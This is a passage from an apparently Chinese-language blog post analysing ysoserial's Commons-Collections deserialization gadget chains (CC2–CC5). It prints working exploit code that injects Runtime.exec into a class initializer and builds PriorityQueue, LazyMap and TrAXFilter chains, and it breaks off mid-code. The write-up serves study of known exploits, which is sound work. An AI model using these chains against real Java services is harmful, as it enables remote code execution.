<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进getTransletInstance函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进defineTransletClasses</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">    _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">        _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">        <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if this is the main class</span></span><br><span class="line">        <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">            _transletIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">    ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">    ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再回到前面的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p>可以看出这里的逻辑为先将设定好的bytecode还原为class，再通过newInstance进行实例化，那么由于bytecode是由我们自己定义的，所以这里就存在了恶意代码的触发，例子如下：</p>
<p>这里选取的是createTemplateImpl类中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// use template gadget class</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line"><span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"><span class="comment">// run command in static initializer</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">    command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">    <span class="string">"\");"</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">clazz.setSuperclass(superC);</span><br></pre></td></tr></table></figure>

<p>上述代码首先是拿到了自己写的一个StubTransletPayload类，并且设置了static initializer,最后将其父类设置为abstTranslet类</p>
<p>这样在每次每次初始化该类的时候都会自动去调用static部分的代码，也就是我们通过clazz.makeClassInitializer().insertAfter设置的代码</p>
<h4 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">	<span class="comment">// mock method name until armed</span></span><br><span class="line">	<span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">	<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">	<span class="comment">// stub data for replacement later</span></span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch method called by comparator</span></span><br><span class="line">	Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch contents of queue</span></span><br><span class="line">	<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">"queue"</span>);</span><br><span class="line">	queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">	queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h4><p>在CommonsCollection这条链中其实有很多细节可以学习一下</p>
<p>比如为什么要通过反射来将构造好的template传入</p>
<p>下面针对以上这个问题进行一些跟进分析</p>
<p>其实对于这个问题来说，不通过反射传入template，直接传入也是可以的，修改后的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">	<span class="comment">// mock method name until armed</span></span><br><span class="line">	<span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">	<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">	<span class="comment">// stub data for replacement later</span></span><br><span class="line">	queue.add(templates);</span><br><span class="line">	queue.add(templates);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch method called by comparator</span></span><br><span class="line">	Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch contents of queue</span></span><br><span class="line">	<span class="comment">//final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");</span></span><br><span class="line">	<span class="comment">//queueArray[0] = templates;</span></span><br><span class="line">	<span class="comment">//queueArray[1] = 1;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说其实不通过反射来更改数组中的值也是可以的，不过如果说换种写法，第二个add里面传入的是数字或者字符串，则会爆出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">		queue.add(templates);</span><br><span class="line">		queue.add(1);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">The method &#39;newTransformer&#39; on &#39;class java.lang.Integer&#39; does not exist</span><br></pre></td></tr></table></figure>

<p>这是因为在第二次add后会有一次位置对象交换</p>
<p><img src="https://s1.ax1x.com/2020/07/24/Uv9Z5t.png" alt="Uv9Z5t.png"></p>
<p>这里直接是把queue数组中的第一个元素更改为了1，所以在下次newTransformer方法调用的时候，会先掉用Integer类的newTransformer，导致报错，终止后面TemplateImpl类的正常调用，所以这里放过来也能理解了为什么在ysoserial中templatesImpl的设置会是通过反射调用的，为了防止add函数产生的位置交换，可以先拿到queue这个数组，直接更改数组里面的值就好了，这样就可以更确保我们的第一个值一定是TemplateImpl这个类。</p>
<h4 id="Effect-1"><a href="#Effect-1" class="headerlink" title="Effect"></a>Effect</h4><p><img src="https://s1.ax1x.com/2020/07/10/UMBMhd.png" alt="UMBMhd.png"></p>
<h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><h4 id="Gadget-Chain-3"><a href="#Gadget-Chain-3" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">   AnnotationInvocationHandler.readObject()</span><br><span class="line">      Map(Proxy).entrySet()</span><br><span class="line">         AnnotationInvocationHandler.invoke()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">               ChainedTransformer.transform()</span><br><span class="line">                  ConstantTransformer.transform()</span><br><span class="line">                  InstantiateTransformer.transform()</span><br><span class="line">                  	TrAXFilter#TrAXFilter()</span><br><span class="line">                  	InstantiateTransformer.newInstance()</span><br><span class="line">                  		TemplatesImpl.newTransformer()</span><br><span class="line">                  			...</span><br><span class="line">                  				Runtime.exec()</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><p>对于commonscollection3来说，其实是和1，2差不多的，只不过是在中间换了一个任意方法执行的类，并且拿了1的开头和2的结尾进行拼凑，最终触发了命令执行</p>
<p>下面主要来跟进分析下中间的链接部分</p>
<p>在上面2的命令执行我们是通过调用newTransformer函数触发static部分内的字节码完成命令执行，也就是通过InvokerTransformer来调用newTransformer方法实现对后面的一系列过程</p>
<p>在commonscollection3中采用的是TrAXFilter+InstantiateTransformer来取代InvokerTransformer</p>
<p>跟进TrAXFilter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在这个类的初始化中可以进行newTransformer方法的调用，我们要做的就是将这个类进行实例化就可以了</p>
<p>跟进InstantiateTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"> .......</span><br></pre></td></tr></table></figure>

<p>可以看到InstantiateTransformer#transform方法中有着对传入类实例化的操作，我们只要将TrAXFilter穿进去就可以了</p>
<p>最终exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Object templatesImpl = Gadgets.createTemplatesImpl(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">		<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">	<span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">			<span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">					new Class[] &#123; Templates.class &#125;,</span><br><span class="line">					<span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">	Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><h4 id="Gadget-Chain-4"><a href="#Gadget-Chain-4" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><pre><code>PriorityQueue.readObject()
    PriorityQueue.heapify()
        PriorityQueue.siftDown()
            PriorityQueue.siftDownUsingComparator()
                TransformingComparator.compare()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                        InstantiateTransformer.newInstance()
                            TrAXFilter#TrAXFilter()
                            TemplatesImpl.newTransformer()
                            ...</code></pre><h4 id="Exploit-Code-3"><a href="#Exploit-Code-3" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><p>commonscolletion4的话其实和前面也差不多，也是分别从2和3中拿出一部分进行拼接，用了2前面的+3后面的</p>
<p>主要跟进分析一些新的利用点，跟进TrAXFilter类，构造方法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里可以看到关键的调用代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>所以只要将构造好的恶意templates传入就可以了</p>
<p>接着跟进InstantiateTransformer#transform</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">transform</span><span class="params">(Class&lt;? extends T&gt; input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a null object"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor&lt;? extends T&gt; con = input.getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: The constructor must exist and be public "</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: InstantiationException"</span>, var4);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Constructor must be public"</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Constructor threw an exception"</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此方法作用为对传入的类进行实例化，通过此transformer方法我们可以将TrAXFilter实例化，调用构造方法，来完成后续恶意代码的执行，那么再配合ChainedTransformer类的transform方法就完整了整条链的构造。</p>
<h4 id="Questions-1"><a href="#Questions-1" class="headerlink" title="Questions"></a>Questions</h4><p>在尝试简化代码的时候遇到了这样的问题</p>
<p>简化的代码如下：</p>
<p><a href="https://imgchr.com/i/aFvZlR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/27/aFvZlR.png" alt="aFvZlR.png"></a></p>
<p>对应报错</p>
<p><a href="https://imgchr.com/i/aFv1te" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/27/aFv1te.png" alt="aFv1te.png"></a></p>
<p>跟进后发现是由于java的SecurityManager检测产生的报错，</p>
<p>以下为oracle官方对SecurityManager的解释</p>
<blockquote>
<p>A security manager is an object that defines a security policy for an application. This policy specifies actions that are unsafe or sensitive. Any actions not allowed by the security policy cause a SecurityException to be thrown. An application can also query its security manager to discover which actions are allowed. Typically, a web applet runs with a security manager provided by the browser or Java Web Start plugin. Other kinds of applications normally run without a security manager, unless the application itself defines one. If no security manager is present, the application has no security policy and acts without restrictions.</p>
</blockquote>
<p>来看下ysoserial中是如何规避这个问题的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Object templates = Gadgets.createTemplatesImpl(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line"></span><br><span class="line">	ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// mock method name until armed</span></span><br><span class="line">	Class[] paramTypes = <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;</span>;</span><br><span class="line">	Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">"foo"</span> &#125;;</span><br><span class="line">	InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">			paramTypes, args);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// grab defensively copied arrays</span></span><br><span class="line">	paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">"iParamTypes"</span>);</span><br><span class="line">	args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">"iArgs"</span>);</span><br><span class="line"></span><br><span class="line">	ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create queue with numbers</span></span><br><span class="line">	PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// swap in values to arm</span></span><br><span class="line">	Reflections.setFieldValue(constant, <span class="string">"iConstant"</span>, TrAXFilter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">	paramTypes[<span class="number">0</span>] = Templates<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">	args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二者的区别是简化的是直接将paramTypes和args在初始化中直接赋值为了templates，原版则是先通过一个copied的数组，在数组里重新进行值的更改，来绕过yso里面SecurityManager的check。</p>
<p>（关于这个地方还是有点细节疑问吧 以后有时间碰到接着回来理顺一下）</p>
<h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><h4 id="Gadget-Chain-5"><a href="#Gadget-Chain-5" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-Code-4"><a href="#Exploit-Code-4" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><p>主要是换了一个触发点，后面的还是原来的思路</p>
<p>触发的地方还是LazyMap#get，接着往前回推调用get的地方</p>
<p>TiedMapEntry.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何将this.map赋为LazyMap就接上了之前的调用，接着找下getValue的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来寻找toString的调用，java的toString和php类似，在对象被当作字符串调用时，触发toString方法</p>
<p>BadAttributeValueExpException.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">       Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           val = <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> 